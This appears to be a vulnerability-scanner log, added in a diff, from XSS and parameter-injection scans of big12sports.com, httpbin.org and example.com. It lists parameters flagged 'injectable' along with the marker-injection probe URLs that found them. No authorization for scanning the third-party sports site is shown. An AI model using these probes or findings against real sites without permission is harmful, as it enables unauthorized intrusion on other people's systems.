+2026-03-23 12:46:34,741 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: __VIEWSTATEGENERATOR (attribute_close)
+2026-03-23 12:46:34,744 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?__VIEWSTATEGENERATOR=superman%22%3E
+2026-03-23 12:46:35,402 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: page (attribute_quote)
+2026-03-23 12:46:35,403 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?page=%22+superman
+2026-03-23 12:46:36,598 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: return (attribute_quote)
+2026-03-23 12:46:36,599 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?return=%22+superman
+2026-03-23 12:46:36,636 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: sidearm-calendar-chooser-button (single_quote)
+2026-03-23 12:46:36,636 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?sidearm-calendar-chooser-button=%27+superman
+2026-03-23 12:46:37,633 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: filter (single_close)
+2026-03-23 12:46:37,633 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?filter=superman%27%3E
+2026-03-23 12:46:37,960 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: search (attribute_quote)
+2026-03-23 12:46:37,960 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?search=%22+superman
+2026-03-23 12:46:39,349 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: sidearm-schedule-select-subscribe (single_close)
+2026-03-23 12:46:39,349 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?sidearm-schedule-select-subscribe=superman%27%3E
+2026-03-23 12:46:39,518 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: sidearm-calendar-select-school (attribute_quote)
+2026-03-23 12:46:39,518 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?sidearm-calendar-select-school=%22+superman
+2026-03-23 12:46:39,787 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: target (single_quote)
+2026-03-23 12:46:39,787 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?target=%27+superman
+2026-03-23 12:46:41,815 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: tag (attribute_quote)
+2026-03-23 12:46:41,815 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?tag=%22+superman
+2026-03-23 12:46:42,720 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: value (attribute_quote)
+2026-03-23 12:46:42,720 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?value=%22+superman
+2026-03-23 12:46:42,775 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: url (attribute_quote)
+2026-03-23 12:46:42,775 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?url=%22+superman
+2026-03-23 12:46:42,830 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: test (attribute_quote)
+2026-03-23 12:46:42,831 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?test=%22+superman
+2026-03-23 12:46:43,313 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: comment (attribute_quote)
+2026-03-23 12:46:43,313 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?comment=%22+superman
+2026-03-23 12:46:43,333 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: sidearm-calendar-chooser-end-date (attribute_quote)
+2026-03-23 12:46:43,333 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?sidearm-calendar-chooser-end-date=%22+superman
+2026-03-23 12:46:43,501 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: sidearm-calendar-chooser-start-date (single_close)
+2026-03-23 12:46:43,502 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?sidearm-calendar-chooser-start-date=superman%27%3E
+2026-03-23 12:46:43,526 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: debug (single_quote)
+2026-03-23 12:46:43,526 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?debug=%27+superman
+2026-03-23 12:46:43,793 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: payload (single_quote)
+2026-03-23 12:46:43,794 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?payload=%27+superman
+2026-03-23 12:46:44,000 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: category (attribute_close)
+2026-03-23 12:46:44,001 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?category=superman%22%3E
+2026-03-23 12:46:45,590 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: next (attribute_quote)
+2026-03-23 12:46:45,590 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?next=%22+superman
+2026-03-23 12:46:46,084 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: user (attribute_quote)
+2026-03-23 12:46:46,085 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?user=%22+superman
+2026-03-23 12:46:47,268 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: message (attribute_close)
+2026-03-23 12:46:47,268 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?message=superman%22%3E
+2026-03-23 12:46:47,369 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: ad_id (attribute_close)
+2026-03-23 12:46:47,369 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?ad_id=superman%22%3E
+2026-03-23 12:46:48,049 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: redirect (attribute_close)
+2026-03-23 12:46:48,049 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?redirect=superman%22%3E
+2026-03-23 12:46:49,364 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: type (single_quote)
+2026-03-23 12:46:49,364 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?type=%27+superman
+2026-03-23 12:46:49,365 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 12:46:49,365 - VulnerabilityScanner - INFO - 🔗 Testing 8 discovered URLs for parameter injection...
+2026-03-23 12:46:53,366 - VulnerabilityScanner - INFO - ✅ Discovered URLs XSS testing complete
+2026-03-23 12:46:53,367 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-23 12:46:53,367 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-23 12:47:33,052 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-23 12:47:33,052 - VulnerabilityScanner - INFO - 🔍 [NUCLEI-ADVANCED] Starting advanced template scanning...
+2026-03-23 12:54:06,822 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 12:54:23,575 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 12:54:28,861 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 12:54:28,861 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 12:54:28,861 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 12:54:28,861 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 12:56:34,197 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/anything?test=hello
+2026-03-23 12:56:34,198 - VulnerabilityScanner - INFO - Testing 29 parameter(s)
+2026-03-23 12:56:34,198 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 12:56:34,198 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 12:56:35,532 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: data (tag_break)
+2026-03-23 12:56:35,532 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&data=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:35,535 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: keyword (tag_break)
+2026-03-23 12:56:35,535 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&keyword=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:35,537 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: type (tag_break)
+2026-03-23 12:56:35,538 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&type=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:35,541 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: callback (tag_break)
+2026-03-23 12:56:35,542 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&callback=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:35,542 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: return (tag_break)
+2026-03-23 12:56:35,544 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: xss (tag_break)
+2026-03-23 12:56:35,547 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&xss=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:35,546 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&return=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:35,546 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: test (tag_break)
+2026-03-23 12:56:35,549 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:35,554 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: message (tag_break)
+2026-03-23 12:56:35,555 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&message=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:35,557 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: name (tag_break)
+2026-03-23 12:56:35,557 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&name=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:35,717 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: input (tag_break)
+2026-03-23 12:56:35,718 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&input=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:36,765 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: debug (tag_break)
+2026-03-23 12:56:36,766 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&debug=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:36,799 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: url (tag_break)
+2026-03-23 12:56:36,800 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&url=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:36,807 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: value (tag_break)
+2026-03-23 12:56:36,808 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&value=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:36,831 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: param (tag_break)
+2026-03-23 12:56:36,831 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&param=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:36,837 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: filter (tag_break)
+2026-03-23 12:56:36,837 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&filter=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:37,016 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: payload (tag_break)
+2026-03-23 12:56:37,017 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&payload=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:37,017 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: next (tag_break)
+2026-03-23 12:56:37,019 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&next=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:37,058 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: id (tag_break)
+2026-03-23 12:56:37,058 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&id=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:37,110 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: tag (tag_break)
+2026-03-23 12:56:37,110 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&tag=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:37,355 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: comment (tag_break)
+2026-03-23 12:56:37,355 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&comment=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:38,104 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: email (tag_break)
+2026-03-23 12:56:38,104 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&email=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:38,139 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: user (tag_break)
+2026-03-23 12:56:38,139 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&user=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:38,145 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: sort (tag_break)
+2026-03-23 12:56:38,146 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&sort=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:38,146 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: search (tag_break)
+2026-03-23 12:56:38,147 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&search=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:38,169 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: redirect (tag_break)
+2026-03-23 12:56:38,169 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&redirect=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:38,374 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: username (tag_break)
+2026-03-23 12:56:38,374 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&username=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:38,421 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: category (tag_break)
+2026-03-23 12:56:38,421 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&category=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:38,423 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: page (tag_break)
+2026-03-23 12:56:38,423 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&page=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:38,590 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: q (tag_break)
+2026-03-23 12:56:38,590 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=hello&q=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 12:56:38,591 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 12:56:38,592 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-23 12:56:53,166 - VulnerabilityScanner - INFO - ✅ Nuclei scan completed with no vulnerabilities
+2026-03-23 12:57:31,579 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 12:58:07,116 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 13:11:19,983 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 13:11:19,984 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 13:11:19,984 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 13:11:19,984 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 13:11:19,984 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 13:23:50,821 - VulnerabilityScanner - INFO - ✅ Playwright discovered 13 parameters
+2026-03-23 13:25:34,234 - VulnerabilityScanner - INFO - ✅ Discovered 26 unique parameters: target, CURRENT_PAGE, PALBID, sidearm-schedule-select-subscribe, sidearm-calendar-select-sport, DB_LANG, ATCLID, amp;DB_OEM_ID, sidearm-calendar-chooser-button, DB_OEM_ID
+2026-03-23 13:25:34,235 - VulnerabilityScanner - INFO - ✅ Discovered 106 URLs with parameters
+2026-03-23 13:25:34,235 - VulnerabilityScanner - INFO - ✓ Discovered 26 parameters from domain, testing 55 total with common defaults
+2026-03-23 13:25:34,235 - VulnerabilityScanner - INFO - 🔗 Also testing 106 discovered URLs for XSS injection...
+2026-03-23 13:25:34,235 - VulnerabilityScanner - INFO - Testing 55 parameter(s)
+2026-03-23 13:25:34,235 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 13:25:34,235 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 13:26:22,687 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 13:26:22,687 - VulnerabilityScanner - INFO - 🔗 Testing 106 discovered URLs for parameter injection...
+2026-03-23 13:28:02,762 - VulnerabilityScanner - INFO - ✅ Discovered URLs XSS testing complete
+2026-03-23 13:28:02,763 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-23 13:28:02,763 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-23 13:28:41,923 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-23 13:28:41,924 - VulnerabilityScanner - INFO - 🔍 [NUCLEI-ADVANCED] Starting advanced template scanning...
+2026-03-23 13:34:49,730 - VulnerabilityScanner - INFO - Scanner initialized for: https://example.com
+2026-03-23 13:34:49,731 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 13:34:49,731 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 13:34:49,764 - VulnerabilityScanner - INFO - 🔍 [KATANA] Running URL enumeration with katana...
+2026-03-23 13:34:49,799 - VulnerabilityScanner - INFO -    ✅ Katana found 0 URLs with 0 new parameters
+2026-03-23 13:34:49,804 - VulnerabilityScanner - INFO - 🔍 [WAYBACKURLS] Running URL enumeration with waybackurls...
+2026-03-23 13:36:19,897 - VulnerabilityScanner - INFO -    ⚠️  Waybackurls found no URLs
+2026-03-23 13:36:19,903 - VulnerabilityScanner - INFO - 🔍 [GAU] Running URL enumeration with gau...
+2026-03-23 13:37:49,996 - VulnerabilityScanner - INFO -    ⚠️  Gau found no URLs
+2026-03-23 13:49:40,599 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 13:49:40,599 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 13:49:40,600 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 13:49:40,600 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 13:49:40,600 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 14:05:11,159 - VulnerabilityScanner - INFO - ✅ Playwright discovered 13 parameters
+2026-03-23 14:05:11,309 - VulnerabilityScanner - INFO - 🔍 [KATANA] Running URL enumeration with katana...
+2026-03-23 14:05:11,368 - VulnerabilityScanner - INFO -    ✅ Katana found 0 URLs with 0 new parameters
+2026-03-23 14:05:11,392 - VulnerabilityScanner - INFO - 🔍 [WAYBACKURLS] Running URL enumeration with waybackurls...
+2026-03-23 14:06:41,504 - VulnerabilityScanner - INFO -    ⚠️  Waybackurls found no URLs
+2026-03-23 14:06:41,529 - VulnerabilityScanner - INFO - 🔍 [GAU] Running URL enumeration with gau...
+2026-03-23 14:08:11,622 - VulnerabilityScanner - INFO -    ⚠️  Gau found no URLs
+2026-03-23 14:08:11,623 - VulnerabilityScanner - INFO - ✅ Discovered 13 unique parameters: sidearm-calendar-chooser-start-date, __VIEWSTATE, __VIEWSTATEGENERATOR, videosSelect, sidearm-calendar-chooser-end-date, target, ad_id, searchInput, sidearm-calendar-select-school, sidearm-calendar-select-sport
+2026-03-23 14:08:11,623 - VulnerabilityScanner - INFO - ✅ Discovered 8 URLs with parameters
+2026-03-23 14:08:11,623 - VulnerabilityScanner - INFO - ✓ Discovered 13 parameters from domain, testing 42 total with common defaults
+2026-03-23 14:08:11,623 - VulnerabilityScanner - INFO - 🔗 Also testing 8 discovered URLs for XSS injection...
+2026-03-23 14:08:11,623 - VulnerabilityScanner - INFO - Testing 42 parameter(s)
+2026-03-23 14:08:11,623 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 14:08:11,623 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 14:08:50,873 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 14:08:50,873 - VulnerabilityScanner - INFO - 🔗 Testing 8 discovered URLs for parameter injection...
+2026-03-23 14:08:56,825 - VulnerabilityScanner - INFO - ✅ Discovered URLs XSS testing complete
+2026-03-23 14:08:56,826 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-23 14:08:56,826 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-23 14:09:49,359 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-23 14:09:49,359 - VulnerabilityScanner - INFO - 🔍 [NUCLEI-ADVANCED] Starting advanced template scanning...
+2026-03-23 14:29:56,447 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 14:29:56,448 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 14:29:56,448 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 14:29:56,448 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 14:29:56,500 - VulnerabilityScanner - INFO - 🔍 [GAU+KATANA] Running URL enumeration with gau piped to katana...
+2026-03-23 14:31:40,331 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 14:31:40,331 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 14:31:40,331 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 14:31:40,331 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 14:31:40,331 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 14:40:53,086 - VulnerabilityScanner - INFO - ✅ Playwright discovered 13 parameters
+2026-03-23 14:40:53,244 - VulnerabilityScanner - INFO - 🔍 [GAU+KATANA] Running URL enumeration with gau piped to katana...
+2026-03-23 14:42:23,329 - VulnerabilityScanner - INFO -    ⚠️  Gau→Katana found no URLs
+2026-03-23 14:42:23,386 - VulnerabilityScanner - INFO - 🔍 [WAYBACKURLS+KATANA] Running URL enumeration with waybackurls piped to katana...
+2026-03-23 14:43:53,474 - VulnerabilityScanner - INFO -    ⚠️  Waybackurls→Katana found no URLs
+2026-03-23 14:43:53,528 - VulnerabilityScanner - INFO - 🔍 [KATANA-DIRECT] Running URL crawling with katana directly on target...
+2026-03-23 14:43:53,581 - VulnerabilityScanner - INFO -    ✅ Katana-Direct found 0 URLs with 0 new parameters
+2026-03-23 14:43:53,582 - VulnerabilityScanner - INFO - ✅ Discovered 13 unique parameters: sidearm-calendar-chooser-end-date, __VIEWSTATE, sidearm-calendar-select-school, __VIEWSTATEGENERATOR, searchInput, path, videosSelect, ad_id, sidearm-calendar-chooser-button, sidearm-calendar-chooser-start-date
+2026-03-23 14:43:53,582 - VulnerabilityScanner - INFO - ✅ Discovered 8 URLs with parameters
+2026-03-23 14:43:53,583 - VulnerabilityScanner - INFO - ✓ Discovered 13 parameters from domain, testing 42 total with common defaults
+2026-03-23 14:43:53,583 - VulnerabilityScanner - INFO - 🔗 Also testing 8 discovered URLs for XSS injection...
+2026-03-23 14:43:53,583 - VulnerabilityScanner - INFO - Testing 42 parameter(s)
+2026-03-23 14:43:53,583 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 14:43:53,583 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 14:44:32,564 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 14:44:32,564 - VulnerabilityScanner - INFO - 🔗 Testing 8 discovered URLs for parameter injection...
+2026-03-23 14:44:36,272 - VulnerabilityScanner - INFO - ✅ Discovered URLs XSS testing complete
+2026-03-23 14:44:36,272 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-23 14:44:36,273 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-23 14:45:16,500 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-23 14:45:16,508 - VulnerabilityScanner - INFO - 🔍 [NUCLEI-ADVANCED] Starting advanced template scanning...
+2026-03-23 14:48:16,923 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 14:48:16,923 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 14:48:16,923 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 14:48:16,923 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 14:48:16,972 - VulnerabilityScanner - INFO - 🔍 [GAU+KATANA] Running URL enumeration with gau piped to katana...
+2026-03-23 14:51:20,961 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 14:51:20,961 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 14:51:20,961 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 14:51:20,961 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 14:51:20,961 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 15:00:02,631 - VulnerabilityScanner - INFO - ✅ Playwright discovered 13 parameters
+2026-03-23 15:00:02,764 - VulnerabilityScanner - INFO - 🔍 [GAU+KATANA] Running URL enumeration with gau piped to katana...
+2026-03-23 15:01:32,842 - VulnerabilityScanner - INFO -    ⚠️  Gau→Katana found no URLs
+2026-03-23 15:01:32,891 - VulnerabilityScanner - INFO - 🔍 [WAYBACKURLS+KATANA] Running URL enumeration with waybackurls piped to katana...
+2026-03-23 15:03:02,957 - VulnerabilityScanner - INFO -    ⚠️  Waybackurls→Katana found no URLs
+2026-03-23 15:03:02,995 - VulnerabilityScanner - INFO - 🔍 [KATANA-DIRECT] Running URL crawling with katana directly on target...
+2026-03-23 15:03:03,034 - VulnerabilityScanner - INFO -    ✅ Katana-Direct found 0 URLs with 0 new parameters
+2026-03-23 15:03:03,042 - VulnerabilityScanner - INFO - ✅ Discovered 13 unique parameters: sidearm-calendar-select-school, sidearm-calendar-chooser-end-date, ad_id, path, __VIEWSTATE, sidearm-schedule-select-subscribe, sidearm-calendar-chooser-button, videosSelect, __VIEWSTATEGENERATOR, target
+2026-03-23 15:03:03,042 - VulnerabilityScanner - INFO - ✅ Discovered 8 URLs with parameters
+2026-03-23 15:03:03,042 - VulnerabilityScanner - INFO - ✓ Discovered 13 parameters from domain, testing 42 total with common defaults
+2026-03-23 15:03:03,042 - VulnerabilityScanner - INFO - 🔗 Also testing 8 discovered URLs for XSS injection...
+2026-03-23 15:03:03,042 - VulnerabilityScanner - INFO - Testing 42 parameter(s)
+2026-03-23 15:03:03,042 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
